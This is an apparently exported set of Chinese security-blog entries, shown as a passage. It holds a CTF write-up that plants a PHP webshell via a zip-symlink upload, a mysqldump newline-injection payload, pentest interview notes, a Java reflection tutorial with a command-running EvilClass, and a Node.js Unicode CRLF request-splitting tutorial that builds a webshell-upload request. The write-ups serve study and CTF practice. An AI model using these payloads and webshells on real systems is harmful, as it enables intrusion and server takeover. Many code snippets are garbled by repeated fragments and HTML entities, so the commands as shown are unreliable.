/tmp && unzip -o &#x27; . $_FILES[\"file\"][\"tmp_name\"]);\n&#125;;\n\n//only this!\n\n 首先对上传文件的类型进行了判断\nif (finfo_file($finfo, $_FILES[&quot;file&quot;][&quot;tmp_name&quot;]) === if (finfo_file($finfo, $_FILES[&quot;file&quot;][&quot;tmp_name&quot;]) === &#x27;application/zip&#x27;)\n\n需要上传的文件类型为application/zip，然后执行\nexec(&#x27;cd /tmp &amp;&amp; unzip -o &#x27; . $_FILES[&quot;file&quot;][exec(&#x27;cd /tmp &amp;&amp; unzip -o &#x27; . $_FILES[&quot;file&quot;][\"tmp_name\"]);\n\n软链接发现上传的压缩包中文件都被解压在了tmp目录下，如果想要访问，就需要利用软链接，从/tmp链接到/var/www/html\nln -s /var/www/html ln -s /var/www/html test\n\n\n\n但是想要把软链接打包在压缩包中，需要加上参数--symlinks，如果不加上，压缩软链接会把它们指向的实际文件或文件夹压缩进去，而不是保留软链接本身。\nzip --symlinks zip --symlinks test ./*\n\n这样test就指向了/var/www/html\n\n\n构造木马压缩包然后建一个相同名字的文件夹test，向其中放入一句话🐎\necho echo &#x27;&#x27; > shell.php\n\n\n然后将这个新建的且包含一句话🐎test文件夹打包成压缩包test1.zip\nzip -r test1.zip zip -r test1.zip test\n\n\n\np.s.为什么呢？\n\n\n\n\n\n\n\n\n这里的test1.zip中包含的文件夹名和软链接的名字是一样的，当压缩包在和软链接相同的路径下解压时，因为相同名字的文件不能出现在同意路径下，所以当一个相同名字的文件夹想要解压到有个相同名字的软链接时，\n解压命令会把软链接的指向路径当作文件夹名字，从而实现将我们这里的一句话🐎移到/var/www/html下面\nunzip -o test1.zip\n\n-o起到的是强制覆盖文件的作用，但是只覆盖普通文件，像文件夹和软链接不会被覆盖，所以这里就不需要担心解压相同名字的文件夹在当前目录会把软链接覆盖，其实相反的，软链接指向的路径反而替代了文件夹的名字\n如下所示，\n\n\n\n\n\n\n\n\n\n\n\n可以看到我们的shell.php被解压到了test软链接所指向的路径\n解题先将我们的包含软链接的压缩包test.zip上传上去，避免如果先上传包含木马的，会被test文件夹占用位置\n进行上传，虽然上传后和之前一样会回到upload.php，但是进入docker中可以看到是压缩包确实上传解压成功了\n\n\n\n\n然后我们再上传test1.zip，根据我们之前分析的，会将其中的test文件夹下的木马解压到/var/www/html下，也就是首页\n操作同上，发现shell.php确实上传到网站首页\n\n\n直接连接\n\n\n\n\n得到flag\n\n\n结束\nDebugSer\n\n\n\n\n\n\n\n\n题目内容：\n远程环境jdk1.8.0_20\n更新提示1：cn.hutool.json.JSONObject.put-&gt;com.app.Myexpect#getAnyexcept\n 考察cc链的改造\nBackendService\n\n\n\n\n\n\n\n\n题目内容：\n小明拿到了内网一个老旧服务的应用包，虽然有漏洞但是怎么利用他呢？[注意：平台题目下发后请访问&#x2F;nacos路由]\nCVE-2022-22947改了一些代码 \n\n\n\n\n\n\n\n\n\nNacos结合Spring Cloud Gateway RCE利用\ndumpit\n\n\n\n\n\n\n\n\n题目内容：\nflag in &#x2F;flag\n找不到环境了，就是好像直接可以执行命令，利用mysqldump\nflag就在环境变量里，执行env即可，就是需要分隔符\npayload为\n\n\n\n\n\n\n\n\n\n/?db=&amp;table_2_dump=%0a%20env\n环境变量中即可看到flag\n","slug":"2023CISCN初赛","date":"2023-06-13T16:36:32.535Z","categories_index":"网络安全学习","tags_index":"Game","author_index":"Ttoc"},{"id":"b38a3b2d86fba239d1317bb1f7dad2ee","title":"Key_Remember","content":"面试后，发现自己知识点复习不到位，学习不深入，特此记录学习\n\n\n面试问题\n\n\n\n\n\n\n\n\n\n\nsql注入中的延迟函数都有哪些？\nBenchmark()函数重复count次执行表达式\n笛卡尔积\nGET_LOCK(str,timeout)\n给字符串str给定的名字得到一个锁，超时为timeout\nRLIKE\n通过rpad或repeat构造长字符串加以计算量大的pattern，通过repeats参数控制延时长短\n\n\n\n\n\n\n\n\n\n\n\n常见的信息搜集的内容都有哪些？\n文件上传漏洞的常规防护点及绕过方式有哪些？\n解析漏洞有了解吗\nXSS和CSRF的区别？\nCSRF和SSRF的区别？\nXXE漏洞有了解吗，都有哪些分类？\n逻辑漏洞的验证码回显和任意密码重置？\nshiro\nfastjson\nphp反序列化魔法函数\njava重载和重写的区别\n\n\n\n\n\n\n\n\n\n\n\nredis 端口？主从副用的写入shell？\n常见的内网信息收集方式？\n常见的提权方式？\nmysqlUDF提权的方式？前提条件都有哪些？\nmysql  MOF加载提权—导出自定义mof文件到系统目录加载，条件？同udf一样需要手工修改my.ini配置文件，添加 secure-file-priv&#x3D;\n\n\n\n\n\n\n\n\n\n\n\n怎么查看外链端口？\nwindows安全日志里面的事件id，登陆成功登陆失败的事件id是多少\nwindows隐藏账号怎么看？\nwindows wmic怎么查看进程命令？\n勒索病毒常规的处置方法都有哪些？\nlinux计划任务怎么看？还有那些目录？开机启动呢？\nlinux进程目录是哪个？针对进程目录都有哪些分析方法？\n针对java内存马有什么检测方式吗？\n\n\n\n\n\n\n\n\n\n\n\nsip上hw期间都需要关注那些功能点？\nwaf封禁ip如何封禁？\n\n\n\n\n\n\n\n\n\n\nsql注入原理利用方面∶1.有那些写文件方法，写入log里2.有那些读文件方法，权限限制loadfile，所以需要个堆叠条件，为什么首先需要堆叠，创建一个库，3.读写文件的权限，有哪些值，对应代表什么\n除了MySQL，其他数据库还试过哪些\nMySQL执行系统命令方式\n比如在mangodb，如何在其中实现联合注入，报错注入，或者万能密码之类的sqlServe有没有打过，sqlsever执行命令MySQL 版本提权报错注入函数至少有4个，除了updatexml，exec，还有两个。大数报错延时，造成延时的原因，一个可读数据太大，还有个函数getlog，在特殊字符后加一些东西不会影响执行sql查询结果和查询语句一样，联合查询的两个结果要相等，19年考过\n文件包含有个网站，有文件包含漏洞，怎么利用配合临时文件，文件很大，暂时存nlinux自动unlink\n文件名随机怎么利用PHP有个版本，会出现PHP断开，这样不会删除临时文件，这样可以通过爆破实现连接文件接受phpinfo采用流式读取，可以延时断开连接\nsession包含需要session打开，没打开怎么办，页面没有session想办法让它产生session，给它一个session id服务器会对应生成一个session文件，但要想办法控制内容\n通过一些伪协议可以清空日志文件\nssrf打内网，可以打到哪里可以打MySQL，怎么判断ssrf存在考虑出网和不出网两种情况测试不出网也没回显，利用延时，比如访问内网某个不可能有服务的端口，127.0.0.1:1111\ncsrf防御csrf写在post参数中外带cookie的方式\n原型链污染讲讲原理就行为什么要合并对象污染env，把默认shell污染成load\n文件上传&lt;&gt;?怎么绕过PHP5和PHP7怎么办apchea和PHP工作模式，apchea利用Unicode编码，和常见脚本utf8文本格式不同，利用检测是utf8上传zip，怎么实现让它uzip时，把其路径也打包了\n反序列化原理利用引擎不同，读入和读出不一样session\n最近复现cve\n后渗透\nlinux提权\n过滤了&lt;？?&gt; apchape利用 .htaccessGIF89?但是其他.htaccess\nNginx和apahe解析PHP的不同\na_a.b.c\n信息收集自己见解，国内外网站信息收集的区别\n拿下源服务器，你觉得还有什么价值\n怎么批量扫描一些新爆漏洞\n怎么过滤一下收集信息，比如特定IP\n新爆漏洞，补丁有什么价值\n给你0day的exp，你怎么确认资产里有没有0day\n内存dump下来有什么用，比如国赛reading\nspringboot有练过手，一些MySQL配置存在哪些配置\n拿到webshell的服务器，你只能看到防火墙IP，怎么获取具体IP，，用dnslog\n了解过蜜罐吗，\n内网域控\n随便说点印象深刻的题\n","slug":"Key","date":"2023-05-02T15:53:19.742Z","categories_index":"Work","tags_index":"Work","author_index":"Ttoc"},{"id":"596851cfa889be93058fd848fb13297d","title":"Java安全[反射(1)]","content":"Java学好的主要性太大了，之前我一直没总体归纳，这次彻底狠狠的深入\n主要阅读p牛的&lt;&lt;Java安全漫谈&gt;&gt;\n\n\nJava安全[反射(1)]本文要点\n\n\n\n\n\n\n\n\n“类初始化”和“类实例化”严格区分\n反射的概念\n\n\n\n\n\n\n\n\n反射是大多数语言不可少的一部分，\n指在程序运行中，对于任何一个类，都可以通过反射拿到所有属性和方法（包含私有），\n拿到的方法可以调用，总之通过反射，我们可以蒋Java这种静态的语言附加上动态的特性。\n反射是指运行时检查和操作类、接口、字段、方法等程序结构的能力。\n\nJava的反射是指程序在运行期可以拿到一个对象的所有信息。\n它允许运行中的 Java 程序对自身进行检查，或者说“自审”，并能直接操作程序的内部属性和方法。\n\n*Class对象与反射的关系\n\n\n\n\n\n\n\n\nClass对象是Java反射机制的入口，它封装了一个类或接口的运行时信息。\n通过调用Class类的方法，可以获取这些信息，包括类的构造函数、方法、属性等。\n这些信息可以用来在运行时动态地创建对象、调用方法和访问字段\nClass对象与Class的关系\n\n\n\n\n\n\n\n\n每一个类都有一个对应的Class对象,它封装了该类的运行时信息。 \nClass对象与实例对象的关系\n\n\n\n\n\n\n\n\nClass对象表示类运行时的信息，而实例对象则是类的一个具体实例。\n每个实例对象都属于一个特定的类，并且与该类的Class对象相关联。\n可以通过实例对象来获取其所属类的Class对象，也可通过Class对象来创建实例对象。\n*反射例子public void execute(String className, String methodName) public void execute(String className, String methodName) throws Exception &#123;\n     Class clazz = Class.forName(className);\n     clazz.getMethod(methodName).invoke(clazz.newInstance());\n&#125;\n\n上面的例子中,这几个方法包揽了几个在反射中极为重要的方法\n\n\n\n\n\n\n\n\n\n\n获取类的方法: forName\n\n实例化类对象的方法: newInstance\n\n从java9开始，建议使用getDeclaredConstructor().newInstance()来代替newInstance方法，因为newInstance方法会抛出不必要的\nInstantiationException和IllegalAccessException异常，而且它也不够清晰地表明正在调用构造函数。\n\n获得函数的方法: getMethod\n\n执行函数的方法: invoke\n\n\n\n以上的四种方法几乎包揽所有Java安全中各种发射有关的payload\n\nJava反射运用实例import java.lang.reflect.Method;\n\npublic class ReflectionExample &#123;\n    public static void main(String[] args) throws Exception &#123;\n        // 使用 forName 方法获取类的 Class 对象\n        // 此处获得MyClass类的Class对象\n        Class cls = Class.forName(\"MyClass\");\n\n        // 使用 newInstance 方法实例化类对象\n        Object obj = cls.getDeclaredConstructor().newInstance();\n\n        // 获取方法\n        // String.class 代表参数类型为 String 的方法\n        Method method = cls.getMethod(\"sayHello\", String.class);\n\n        // 执行方法\n        // 第一个参数为类对象，后面的参数为方法的参数\n        method.invoke(obj, \"John\");\n    &#125;\n&#125;\n\nclass MyClass &#123;\n    public void sayHello(String name) &#123;\n        System.out.println(\"Hello, \" + name + \"!\");\n    &#125;\n&#125;\n\n运行截图，获取Myclass类对象，然后调用Myclass中的方法sayHello，主函数说明参数类型String.class并传参John\n\n\n\n\n\n\n\n\n\n\n\nMyclass类可以在src目录以独立的文件格式存在Myclass.class\n但是不能在src目录下存在两个相同名字的类，\n在进行反射时会发生报错：类重复\n\n\n\n获取类的三个方法通常我们有三种方法获取一个”类”,也就是java.lang.Class对象\n\n\n\n\n\n\n\n\n\nforName不是获取”类”的唯一途径。\nobj.getClass()\n\n\n\n\n\n\n\n\n如果上下文存在某个实例obj,那么可以通过obj.getClass()来获取它的类\npublic class public class ReflectionExample &#123;\n    public static void main(String[] args) &#123;\n        MyClass obj = new MyClass();\n        Class cls = obj.getClass();\n        System.out.println(\"Class Name: \" + cls.getName());\n    &#125;\n&#125;\n\nclass MyClass &#123;\n    // 类的定义\n&#125;\n\n一个obj对象MyClass实例\n\n\n两个obj对象MyClass和YourClass实例\n\n.class[不属于反射]\n\n\n\n\n\n\n\n\n如果你已经加载了某个类,只是想获取它的java.lang.Class对象，那么就直接拿它的class属性即可。这个方法其实并不属于反射。\npublic class public class ReflectionExample &#123;\n    public static void main(String[] args) &#123;\n        Class cls = Test.class;\n        System.out.println(\"Class Name: \" + cls.getName());\n    &#125;\n&#125;\n\nclass Test &#123;\n    // 类的定义\n&#125;\n\n\nClass.forName()\n\n\n\n\n\n\n\n\n如果你知道某个类的名字，想获得到这个类，就可以用forName来进行获取\npublic class public class ReflectionExample &#123;\n    public static void main(String[] args) throws ClassNotFoundException &#123;\n        String className = \"MyClass\";\n        Class cls = Class.forName(className);\n        System.out.println(\"Class Name: \" + cls.getName());\n    &#125;\n&#125;\n\nclass MyClass &#123;\n    // 类的定义\n&#125;\n\n\n\n反射的作用\n\n\n\n\n\n\n\n\ngetClass().forName(&quot;java.lang.Runtime&quot;)\n在安全研究中，我们使用反射的一大目的，就是绕过某些沙盒。\n比如，上下文中如果只是Integer类型的数字，我们如何获取到可以执行命令的Runtime类呢？\n也许可以这样（伪代码）：\n1.getClass().forName(1.getClass().forName(\"java.lang.Runtime\")\n\n\n\n\n\n\n\n\n\n\n这个代码看不懂，找了几篇文章，下面是个人理解：\n这段代码是非常常见的payload格式，在很多服务器报警和CVE中常见，下面是一个对应漏洞分析文档\nhttp://exploit-db.com/docs/english/46303-remote-code-execution-with-el-injection-vulnerabilities.pdf\n常见的格式应该是这种\n*.getclass().forname(&quot;java.lang.Runtime&quot;).getRuntime().exec()\n文档中对该payload进行了展示(经典谈计算器\n\n\n对Runtime类，执行命令的功能效果，实例代码执行\nimport java.io.IOException;\n\npublic class CommandExecution &#123;\n    public static void main(String[] args) &#123;\n        try &#123;\n            // 执行命令\n            Process process = Runtime.getRuntime().exec(\"calc\");\n            // 等待命令执行完成\n            process.waitFor();\n            // 获取命令的退出值\n            int exitValue = process.exitValue();\n            System.out.println(\"命令执行完成，退出值：\" + exitValue);\n        &#125; catch (IOException | InterruptedException e) &#123;\n            e.printStackTrace();\n        &#125;\n    &#125;\n&#125;\n\n\nforName重载&#x2F;加载&#x2F;初始化可以看看菜鸟教程或者其他文章\n\n\n\n\n\n\n\n\n\nJava class.forname 详解 | 菜鸟教程 (runoob.com)\n【Java核心技术】类型信息(Class对象 反射 动态代理) - luoxn28 - 博客园 (cnblogs.com)\nClass.forName()用法详解_mocas_wang的博客-CSDN博客\nforName有两个函数重载： \n\n\n\n\n\n\n\n\n\n\nClass&lt;?&gt; forName(String name) \nClass&lt;?&gt; forName(String name, boolean initialize, ClassLoader loader)\n\n第一个就是我们最常见的获取class的方式，其实可以为第二种方式的一个封装\nClass.forName(className)\n// 等于\nClass.forName(className,true,currentLoader)\n\n默认情况下，\nforName的第一个参数是类名forName的第二参数表示是否初始化第二个参数initialize常常被人误解，使用功能”.class”来创建Class对象的引用时\n\n\n\n\n\n\n\n\n\n.class和forName()在Java中的区别是：\n\n.class是在编译时确定的，不会触发类的初始化，只是获取类的Class对象\nforName()是在运行时动态加载类，并且会触发类的初始化，除非指定initialize为false\n\np.s.初始化类和创建类对象的区别\n\n\n\n\n\n\n\n\n初始化类和创建类对象的区别是：\n\n初始化类是指加载类的字节码到内存中，并执行类的静态变量和静态代码块。初始化类只会发生一次，仅仅当类被首次使用时。\n创建类对象是指使用类的构造方法来分配内存空间，并给对象的属性赋值。创建类对象可以发生多次，每次都会返回一个新的对象。\n\n所以第二参数即使为initialize=true，这里指的也是初始化类而非创建类对象，所以不会触发构造函数\nforName()\n\n\n\n\n\n\n\n\n通过这个例子，\n可以看到初始化的作用和创建类对象，\n\n第一次初始化时，加载静态变量和静态代码块，打印数据\n2\nstatic block\n\n\n\n\n\n\n\n\n\n第二次初始化时，不加载静态变量和静态代码块，无任何打印数据\n\n\n\n\n\n\n\n\n\n当创建类对象时，加载类中构造函数，如果多次创建类对象，会执行多次构造函数\n\n\n\n.class\n\n\n\n\n\n\n\n\n可以看到.class不会进行初始化静态变量和静态代码块，也不会创建类对象\n\n常见有三种初始化\npublic class public class TrainPrint &#123;\n    &#123;\n        System.out.printf(\"Empty block initial %s\\n\", this.getClass());\n    &#125;\n    static &#123;\n        System.out.printf(\"Static initial %s\\n\", TrainPrint.class);\n    &#125;\n    public TrainPrint() &#123;\n        System.out.printf(\"Initial %s\\n\", this.getClass());\n    &#125;\n&#125;\n\n\n\n\n\n\n\n\n\n\n这三种中，\n最先调用的是static&#123;&#125;\n然后是单个中&#123;&#125;\n最后是构造函数\n运行便可知，\n\n\n\n\n\n\n\n\n\n\n\n因为static&#123;&#125;是类初始化时调用的，而&#123;&#125;中代码是放在构造函数super()后面，也就是构造函数的前面\n&#x3D;&#x3D;&gt;\n\n\n\n\n\n\n\n\n\nforName中initialize=true其实就是告诉Java虚拟机是否执行类初始化\n恶意调用假如我们有如下函数，其中函数的参数name可控：\npublic void ref(String name) public void ref(String name) throws Exception &#123;\n        Class.forName(name);\n&#125;\n\n我们再构造一个恶意类，将恶意的代码放置在static&#123;&#125;中，从而执行\nimport java.lang.Runtime;\nimport java.lang.Process;\npublic class EvilClass &#123;\n    static &#123;\n        try &#123;\n            Runtime rt = Runtime.getRuntime();\n            String[] commands = &#123;\"touch\", \"/tmp/success\"&#125;;\n            Process pc = rt.exec(commands);\n            pc.waitFor();\n        &#125; catch (Exception e) &#123;\n            // do nothing\n        &#125;\n    &#125;\n&#125;\n\n当然，这个恶意类如何带入目标机器中，可能就涉及到ClassLoader的一些利用方法\n后面学到会补充这里实现传入的过程\nforName的第三个参数ClassLoader\n\n\n\n\n\n\n\n\nClassLoader是什么呢？\n它就是一个”加载器”，告诉Java虚拟机如何加载这个类。\nJava中默认的ClassLoader就是根据类名来加载类，这个类名是类的完整路径，如java.lang.Runtime。\n","slug":"Java安全[反射(1)]","date":"2023-05-02T15:44:02.117Z","categories_index":"Java漫谈学习","tags_index":"Java","author_index":"Ttoc"},{"id":"eb3e8dc673fc9bb8b7949a865517e770","title":"Interesting Game wp","content":"todo上的一些题目\n\n\nXCTF FINAL 2021warmupcms\n\n\n\n\n\n\n\n\n附件的docker和题目除了flag以外完全一样，建议先本地打通再打远程。需要去后台正确设置题目的url为你实际用的ip:port，前台的css&#x2F;js等静态文件才能正常显示，后台显示是正常的。如果是本地搭环境，你可以直接编辑sql文件修改；如果是远程，可以登录到后台-系统设置进行修改。\n有一个0day，5月31号修复完了 这个docker里还是未修复版本 \n还有另外一个0day 都可以getshell\neasycms\n\n\n\n\n\n\n\n\n一个0day在后端 文件上传\n一个0day在前端文件上传 需要伪造jwt\nGKCTF 2021easycms\n\n\n\n\n\n\n\n\n参考禅知后台getshell - 禅知\n强网杯2021OA\n\n\n\n\n\n\n\n\n目标是RCE\n仅容许test用户登入\nmDNZ\n\n\n\n\n\n\n\n\n目标是rce\n可登陆admin后台\n虎符杯2022easychain\n\n\n\n\n\n\n\n\n环境不出网，目标是命令执行并回显\neasysql\n\n\n\n\n\n\n\n\nmysql密码在环境变量\ndocker pull ccr.ccs.tencentyun.com/cttf/hfctf-2022-babysql ./main.sh\n\n美团CTFeasycmsdocker pull y4tacker/ez_yxcms:1.0\n\n","slug":"Interesting-Game-wp","date":"2023-04-07T15:00:24.533Z","categories_index":"网络安全学习","tags_index":"Game","author_index":"Ttoc"},{"id":"aa6892c82ad5f1c844ffcb30a272aa78","title":"nodejs(拆分攻击)","content":"总结学习一下，重点把拆分攻击学习记忆一下，原型链污染单独开一篇写\n\n\nres.render()res.render()是 Node.js 中的一个方法，它可以渲染视图并将渲染后的 HTML 字符串发送给客户端。它可用于通过从服务器传递的数据呈现动态内容。\n以下是在 Node.js 中使用 res.render() 的示例代码：\napp.get(&#x27;/&#x27;, function(app.get(&#x27;/&#x27;, function(req, res) &#123;\n  var data = &#123; message: &#x27;你好，世界！&#x27; &#125;;\n  res.render(&#x27;index&#x27;, data);\n&#125;);\n\n在此示例中，当用户访问根 URL 时，服务器将通过使用包含消息  你好，世界！的 data 对象来呈现 index 视图，并向客户端发送响应。\nindex 视图通常是使用模板语言编写的模板文件，例如 EJS、Handlebars 或 Pug。\n重定向概念Express是一个基于Node.js实现的Web框架，\n其响应HTTP请求的response对象中有两个用于URL跳转方法\nres.location()和res.redirect()\nres.location()res.location()里面的参数有三种，一种是当前域名路径（例如”&#x2F;api&#x2F;post”），一种是绝对路径(“https://www.oecom.cn/api/post “)，另一种就是直接一个字符串：back\nres.location(&#x27;/api/post&#x27;);\nres.location(&#x27;https://www.oecom.cn/api/post&#x27;);\nres.location(&#x27;back&#x27;);\n\nres.redirectredirect()可以添加两个参数，\n如果第一个参数为数值类型，则代表重定向方式，第二个参数为字符串类型，就是需要跳转到的路径。\n如果第一个参数就是字符串，则直接代表跳转的路径重定向方式有两种情况，一种是301重定向（永久重定向），另一种是302重定向（临时重定向），如果第一个参数不填，则默认为302重定向。至于第二个参数路径，则和location一致。在redirect中有一种方式是使用相对路径，即：res.redirect(&quot;api/post&quot;)，假设在程序在/get路由下，则表示要跳转的路径为/get/api/post。\n个人不推荐这种方式，因为在后续的代码阅读时不利于快速理解重定向位置。\ndelimiter这是对标签的分隔符定义的选项，有时候当对ssti一些标签进行了过滤，如果存在将参数进行渲染，且参数是可控，可以尝试delimiter添加进去，让其在渲染的时候可以覆盖修改delimiter内容，使得可以用其他分隔符绕过\nCustom delimiters自定义分隔符可以基于每个模板应用，也可以全局应用：\nlet ejs = require(let ejs = require(&#x27;ejs&#x27;),\n    users = [&#x27;geddy&#x27;, &#x27;neil&#x27;, &#x27;alex&#x27;];\n\n// Just one template\nejs.render(&#x27;[?= users.join(\" | \"); ?]&#x27;, &#123;users: users&#125;, &#123;delimiter: &#x27;?&#x27;, openDelimiter: &#x27;[&#x27;, closeDelimiter: &#x27;]&#x27;&#125;);\n// => &#x27;geddy | neil | alex&#x27;\n\n// Or globally\nejs.delimiter = &#x27;?&#x27;;\nejs.openDelimiter = &#x27;[&#x27;;\nejs.closeDelimiter = &#x27;]&#x27;;\nejs.render(&#x27;[?= users.join(\" | \"); ?]&#x27;, &#123;users: users&#125;);\n// => &#x27;geddy | neil | alex&#x27;\n\nNodeJS 中的 CRLF&#x2F;SSRF Injection\n\n\n\n\n\n\n\n\n本文由WHOAMI原创发布\n转载，请参考转载声明，注明出处： https://www.anquanke.com/post/id/240014\n安全客 - 有思想的安全新媒体\n2018 年有研究者发现，当Node.js使用 http.get 向特定路径发出HTTP请求时，发出的请求实际上被定向到了不一样的路径！\n\n深入研究一下，发现这个问题是由Node.js将HTTP请求写入路径时，对Unicode字符的有损编码引起的。\n\n\n\n\n\n\n\n\n\n·注：nodejs&lt;&#x3D;8 的情况下存在 Unicode 字符损坏导致的 HTTP 拆分攻击，nodejs 不会对这些 Unicode 进行编码转义，因为它们不是 HTTP 控制字符\nHTTP 请求路径中的 Unicode 字符损坏虽然用户发出的 HTTP 请求通常将请求路径指定为字符串，但Node.js最终必须将请求作为原始字节输出。JavaScript支持unicode字符串，因此将它们转换为字节意味着选择并应用适当的Unicode编码。对于不包含主体的请求，Node.js默认使用“latin1”，这是一种单字节编码字符集，不能表示高编号的Unicode字符，例如🐶这个表情。所以，当我们的请求路径中含有多字节编码的Unicode字符时，会被截断取最低字节，比如 \\u0130 就会被截断为 \\u30：\n\nUnicode 字符损坏造成的 HTTP 拆分攻击刚才演示的那个 HTTP 请求路径中的 Unicode 字符损坏看似没有什么用处，但它可以在 nodejs 的 HTTP 拆分攻击中大显身手。\n由于nodejs的HTTP库包含了阻止CRLF的措施，即如果你尝试发出一个URL路径中含有回车、换行或空格等控制字符的HTTP请求是，它们会被URL编码，所以正常的CRLF注入在nodejs中并不能利用：\n&gt; var http = require(&gt; var http = require(\"http\");\n> http.get(&#x27;http://47.101.57.72:4000/\\r\\n/WHOAMI&#x27;).output\n[ &#x27;GET /%0D%0A/WHOAMI HTTP/1.1\\r\\nHost: 47.101.57.72:4000\\r\\nConnection: close\\r\\n\\r\\n&#x27; ]\n\n\n但不幸的是，上述的处理Unicode字符错误意味着可以规避这些保护措施。考虑如下的URL，其中包含一些高编号的Unicode字符：\n&gt; &gt; &#x27;http://47.101.57.72:4000/\\u&#123;010D&#125;\\u&#123;010A&#125;/WHOAMI&#x27;\nhttp://47.101.57.72:4000/čĊ/WHOAMI\n\n当 Node.js v8 或更低版本对此URL发出 GET 请求时，它不会进行编码转义，因为它们不是HTTP控制字符：\n&gt; http.get(&#x27;http://47.101.57.72:4000/\\u010D\\u010A/WHOAMI&#x27;).&gt; http.get(&#x27;http://47.101.57.72:4000/\\u010D\\u010A/WHOAMI&#x27;).output\n[ &#x27;GET /čĊ/WHOAMI HTTP/1.1\\r\\nHost: 47.101.57.72:4000\\r\\nConnection: close\\r\\n\\r\\n&#x27; ]\n\n但是当结果字符串被编码为 latin1 写入路径时，这些字符将分别被截断为 “\\r”（%0d）和 “\\n”（%0a）：\n&gt; Buffer.from(&#x27;http://47.101.57.72:4000/\\u&#123;010D&#125;\\u&#123;010A&#125;/WHOAMI&#x27;, &#x27;latin1&#x27;).&gt; Buffer.from(&#x27;http://47.101.57.72:4000/\\u&#123;010D&#125;\\u&#123;010A&#125;/WHOAMI&#x27;, &#x27;latin1&#x27;).toString()\n&#x27;http://47.101.57.72:4000/\\r\\n/WHOAMI&#x27;\n\n\n可见，通过在请求路径中包含精心选择的Unicode字符，攻击者可以欺骗Node.js并成功实现CRLF注入。\n不仅是CRLF，所有的控制字符都可以通过这个构造出来。下面是我列举出来的表格，第一列是需要构造的字符，第二列是可构造出相应字符的高编号的Unicode码，第三列是高编号的Unicode码对应的字符，第四列是高编号的Unicode码对应的字符的URL编码：\n\n\n\n字符\n可由以下Unicode编码构造出\nUnicode编码对应的字符\nUnicode编码对应的字符对应的URL编码\n\n\n\n回车符 \\r\n\\u010d\nč\n%C4%8D\n\n\n换行符 \\n\n\\u010a\nĊ\n%C4%8A\n\n\n空格\n\\u0120\nĠ\n%C4%A0\n\n\n反斜杠 \\\n\\u0122\nĢ\n%C4%A2\n\n\n单引号 ‘\n\\u0127\nħ\n%C4%A7\n\n\n反引号 &#96;\n\\u0160\nŠ\n%C5%A0\n\n\n叹号 !\n\\u0121\nġ\n%C4%A1\n\n\n这个bug已经在Node.js10中被修复，如果请求路径包含非Ascii字符，则会抛出错误。但是对于 Node.js v8 或更低版本，如果有下列情况，任何发出HTTP请求的服务器都可能受到通过请求拆实现的SSRF的攻击：\n\n接受来自用户输入的Unicode数据\n并将其包含在HTTP请求的路径中\n且请求具有一个0长度的主体（比如一个 GET 或者 DELETE）\n\n在 HTTP 状态行注入恶意首部字段由于 NodeJS 的这个 CRLF 注入点在 HTTP 状态行，所以如果我们要注入恶意的 HTTP 首部字段的话还需要闭合状态行中 HTTP/1.1 ，即保证注入后有正常的 HTTP 状态行：\n&gt; http.get(&#x27;http://47.101.57.72:4000/\\u0120HTTP/1.1\\u010D\\u010ASet-Cookie:\\u0120PHPSESSID=whoami&#x27;).&gt; http.get(&#x27;http://47.101.57.72:4000/\\u0120HTTP/1.1\\u010D\\u010ASet-Cookie:\\u0120PHPSESSID=whoami&#x27;).output\n[ &#x27;GET /ĠHTTP/1.1čĊSet-Cookie:ĠPHPSESSID=whoami HTTP/1.1\\r\\nHost: 47.101.57.72:4000\\r\\nConnection: close\\r\\n\\r\\n&#x27; ]\n\n\n如上图所示，成功构造出了一个 Set-Cookie 首部字段，虽然后面还有一个 HTTP/1.1 ，但我们根据该原理依然可以将其闭合：\n&gt; http.get(&#x27;http://47.101.57.72:4000/\\u0120HTTP/1.1\\u010D\\u010ASet-Cookie:\\u0120PHPSESSID=whoami\\u010D\\u010Atest:&#x27;).&gt; http.get(&#x27;http://47.101.57.72:4000/\\u0120HTTP/1.1\\u010D\\u010ASet-Cookie:\\u0120PHPSESSID=whoami\\u010D\\u010Atest:&#x27;).output\n[ &#x27;GET /ĠHTTP/1.1čĊSet-Cookie:ĠPHPSESSID=whoamičĊtest: HTTP/1.1\\r\\nHost: 47.101.57.72:4000\\r\\nConnection: close\\r\\n\\r\\n&#x27; ]\n\n\n这样，我们便可以构造 “任意” 的HTTP请求了。\n在 HTTP 状态行注入完整 HTTP 请求首先，由于 NodeJS 的这个 CRLF 注入点在 HTTP 状态行，所以如果我们要注入完整的 HTTP 请求的话需要先闭合状态行中 HTTP/1.1 ，即保证注入后有正常的 HTTP 状态行。其次为了不让原来的 HTTP/1.1 影响我们新构造的请求，我们还需要再构造一次 GET / 闭合原来的 HTTP 请求。\n假设目标主机存在SSRF，需要我们在目标主机本地上传文件。我们需要尝试构造如下这个文件上传的完整 POST 请求：\nPOST /upload.php POST /upload.php HTTP/1.1\nHost: 127.0.0.1\nContent-Length: 437\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryjDb9HMGTixAA7Am6\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\nCookie: PHPSESSID=nk67astv61hqanskkddslkgst4\nConnection: close\n\n------WebKitFormBoundaryjDb9HMGTixAA7Am6\nContent-Disposition: form-data; name=\"MAX_FILE_SIZE\"\n\n100000\n------WebKitFormBoundaryjDb9HMGTixAA7Am6\nContent-Disposition: form-data; name=\"uploaded\"; filename=\"shell.php\"\nContent-Type: application/octet-stream\n\n eval($_POST[\"whoami\"]);?>\n------WebKitFormBoundaryjDb9HMGTixAA7Am6\nContent-Disposition: form-data; name=\"Upload\"\n\nUpload\n------WebKitFormBoundaryjDb9HMGTixAA7Am6--\n\n为了方便，我们将这个POST请求里面的所有的字符包括控制符全部用上述的高编号Unicode码表示：\npayload = payload = &#x27;&#x27;&#x27; HTTP/1.1\n\nPOST /upload.php HTTP/1.1\nHost: 127.0.0.1\nContent-Length: 437\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryjDb9HMGTixAA7Am6\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nAccept-Encoding: gzip, 